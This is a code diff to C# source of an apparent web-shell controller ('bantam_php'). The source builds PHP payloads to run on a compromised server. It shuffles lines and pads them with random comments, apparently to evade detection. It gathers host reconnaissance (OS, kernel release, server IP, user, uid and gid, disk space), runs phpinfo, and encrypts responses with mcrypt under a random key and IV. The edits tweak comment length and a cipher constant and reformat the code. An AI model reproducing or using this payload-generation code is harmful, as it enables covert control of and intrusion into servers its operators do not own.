@@ -78,7 +78,7 @@ namespace bantam_php
         /// </summary>
         /// <param name="maxNum"></param>
         /// <returns></returns>
-        public static string RandomPHPComment(int maxNum = 24)
+        public static string RandomPHPComment(int maxNum = 32)
         {
             //check global cfg check "" if off, and have a slider for amount of comments, and a slider for length of comments
             int length = Helper.RandomNumber(maxNum);
@@ -111,7 +111,7 @@ namespace bantam_php
             string padVar = RandomPHPVar();
             string blockBar = RandomPHPVar();
 
-            result = blockBar + " = mcrypt_get_block_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_CBC);" + RandomPHPComment()
+            result = blockBar + " = mcrypt_get_block_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);" + RandomPHPComment()
                    + padVar + " = " + blockBar + " - (strlen(" + varName + ") % " + blockBar + ");" + RandomPHPComment()
                    + varName + " .= str_repeat(chr(" + padVar + "), " + padVar + ");" + RandomPHPComment()
                    + "echo base64_encode(@mcrypt_encrypt(MCRYPT_RIJNDAEL_128, '" + encryptionKey + "', " + varName + ", MCRYPT_MODE_CBC, '" + encryptionIV + "'));";
@@ -126,7 +126,6 @@ namespace bantam_php
         {
             //todo make dynamic/random
             string varName = "$result";
-
             encryptionIV = EncryptionHelper.GetRandomEncryptionIV();
             encryptionKey = EncryptionHelper.GetRandomEncryptionKey();
 
@@ -182,14 +181,19 @@ namespace bantam_php
                        + totalfreespaceVar + " = @disk_total_space(" + cwdVar + ");" + totalfreespaceVar 
                        + " = " + totalfreespaceVar + " ? " + totalfreespaceVar + " : 1;"),
 
-                kernelVar + " = @php_uname('s');",
-                phpVersionVar + @" = phpversion();",
-                releaseVar + " = @php_uname('r');",
-                serverIpVar + " = $_SERVER['SERVER_ADDR'];",
+                kernelVar       + " = @php_uname('s');",
+                phpVersionVar   + " = phpversion();",
+                releaseVar      + " = @php_uname('r');",
+                serverIpVar     + " = $_SERVER['SERVER_ADDR'];",
                 serverSoftwareVar + " = @getenv('SERVER_SOFTWARE');",
             };
 
             Helper.ShuffleList(lines);
+
+            foreach(var line in lines) {
+                linesRandomized += line;
+                linesRandomized += RandomPHPComment();
+            }
 
             if (encryptResponse) {
                 responseCode = "$result = " + osVar + ".'" + g_delimiter
@@ -218,38 +222,33 @@ namespace bantam_php
                      + "'." + uidVar + ".'" + g_delimiter
                      + "'." + gidVar + ".'" + g_delimiter
                      + "'." + groupVar + ".'" + g_delimiter
-                     + "'."+ phpVersionVar + ";";
+                     + "'." + phpVersionVar + ";";
             }
 
-            foreach(var line in lines) {
-                linesRandomized += line;
-                linesRandomized += RandomPHPComment();
-            }
-          
             return linesRandomized + "if (!function_exists('posix_getegid')) {" 
                                    + RandomPHPComment()
-                                    + userVar + " = @get_current_user();" 
+                                   + userVar + " = @get_current_user();" 
                                    + RandomPHPComment()
-                                    + uidVar + " = @getmyuid();" 
+                                   + uidVar + " = @getmyuid();" 
                                    + RandomPHPComment()
-                                    + gidVar + " = @getmygid();" 
+                                   + gidVar + " = @getmygid();" 
                                    + RandomPHPComment()
-                                    + groupVar + " = '?';" 
+                                   + groupVar + " = '?';" 
                                    + RandomPHPComment()
-                                    + "} else {" 
-	                                + uidVar + " = @posix_getpwuid(posix_geteuid());" 
+                                   + "} else {" 
+	                               + uidVar + " = @posix_getpwuid(posix_geteuid());" 
                                    + RandomPHPComment()
-                                    + gidVar + " = @posix_getgrgid(posix_getegid());" 
+                                   + gidVar + " = @posix_getgrgid(posix_getegid());" 
                                    + RandomPHPComment()
-                                    + userVar + "= "+ uidVar + "['name'];" 
+                                   + userVar + "= "+ uidVar + "['name'];" 
                                    + RandomPHPComment()
-                                    + uidVar + " = "+ uidVar + "['uid'];" 
+                                   + uidVar + " = "+ uidVar + "['uid'];" 
                                    + RandomPHPComment()
-                                    + gidVar + " = "+ gidVar + "['gid'];" 
+                                   + gidVar + " = "+ gidVar + "['gid'];" 
                                    + RandomPHPComment()
-                                    + groupVar + " = "+ gidVar + "['name'];" 
+                                   + groupVar + " = "+ gidVar + "['name'];" 
                                    + RandomPHPComment()
-                                    + "}" 
+                                   + "}" 
                                    + responseCode 
                                    + RandomPHPComment();
         }
@@ -264,18 +263,18 @@ namespace bantam_php
         {
             if (encryptResponse) {
                 return RandomPHPComment() 
-                            + "@ob_start();" 
+                      + "@ob_start();" 
                       + RandomPHPComment()
-                            + "@phpinfo();" 
+                      + "@phpinfo();" 
                       + RandomPHPComment()
-                            + "$result = @ob_get_contents();" 
+                      + "$result = @ob_get_contents();" 
                       + RandomPHPComment()
-                            + "@ob_end_clean();"
+                      + "@ob_end_clean();"
                       + RandomPHPComment();
             } else {
                 return RandomPHPComment() 
-                        + "phpinfo();" 
-                    + RandomPHPComment();
+                       + "phpinfo();" 
+                       + RandomPHPComment();
             }
         }
 
@@ -289,12 +288,12 @@ namespace bantam_php
             string phpTestExecutionWithEcho = string.Empty;
             if (encryptReponse) {
                 phpTestExecutionWithEcho = RandomPHPComment() 
-                                                + "$result = '1';" 
+                                         + "$result = '1';" 
                                          + RandomPHPComment();
 
             } else {
                 phpTestExecutionWithEcho = RandomPHPComment() 
-                                                + "echo '1';" 
+                                         + "echo '1';" 
                                          + RandomPHPComment();
             }
             return phpTestExecutionWithEcho;
